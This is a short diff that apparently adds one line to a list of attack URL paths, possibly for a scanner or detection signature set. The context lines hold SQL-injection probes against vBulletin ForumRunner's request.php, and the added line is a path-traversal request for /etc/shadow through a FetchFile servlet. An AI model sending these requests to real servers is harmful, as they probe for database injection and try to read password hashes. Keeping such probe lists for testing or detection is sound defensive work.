@@ -15,3 +15,4 @@
 /forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
 /forums/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
 /vb/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/servlets/FetchFile?fileName=../../../etc/shadow
